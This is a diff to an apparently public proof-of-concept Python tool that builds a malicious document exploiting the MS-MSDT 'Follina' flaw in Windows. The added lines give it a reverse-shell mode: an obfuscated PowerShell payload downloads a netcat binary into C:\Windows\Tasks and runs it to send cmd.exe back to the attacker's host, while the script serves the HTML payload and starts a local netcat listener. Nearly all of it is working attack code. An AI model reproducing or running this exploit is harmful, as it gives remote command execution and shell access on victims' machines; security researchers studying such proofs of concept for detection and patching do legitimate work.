@@ -13,6 +13,7 @@ import http.server
 import socketserver
 import string
 import socket
+import threading
 
 parser = argparse.ArgumentParser()
 
@@ -43,6 +44,14 @@ parser.add_argument(
     type=int,
     default="8000",
     help="port to serve the HTTP server (default: 8000)",
+)
+
+parser.add_argument(
+    "--reverse",
+    "-r",
+    type=int,
+    default="0",
+    help="port to serve reverse shell on",
 )
 
 
@@ -97,8 +106,12 @@ def main(args):
 
     print(f"[+] created maldoc {args.output}")
 
+    command = args.command
+    if args.reverse:
+        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/master/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+
     # Base64 encode our command so whitespace is respected
-    base64_payload = base64.b64encode(args.command.encode("utf-8")).decode("utf-8")
+    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
 
     # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
     html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
@@ -120,10 +133,32 @@ def main(args):
         def __init__(self, *args, **kwargs):
             super().__init__(*args, directory=serve_path, **kwargs)
 
+        def log_message(self, format, *func_args):
+            if args.reverse:
+                return
+            else:
+                super().log_message(format, *func_args)
+
+        def log_request(self, format, *func_args):
+            if args.reverse:
+                return
+            else:
+                super().log_request(format, *func_args)
+
+    def serve_http():
+        with ReuseTCPServer(("", args.port), Handler) as httpd:
+            httpd.serve_forever()
+
     # Host the HTTP server on all interfaces
     print(f"[+] serving html payload on :{args.port}")
-    with ReuseTCPServer(("", args.port), Handler) as httpd:
-        httpd.serve_forever()
+    if args.reverse:
+        t = threading.Thread(target=serve_http, args=())
+        t.start()
+        print(f"[+] starting 'nc -lvnp {args.reverse}' ")
+        os.system(f"nc -lnvp {args.reverse}")
+
+    else:
+        serve_http()
 
 
 if __name__ == "__main__":
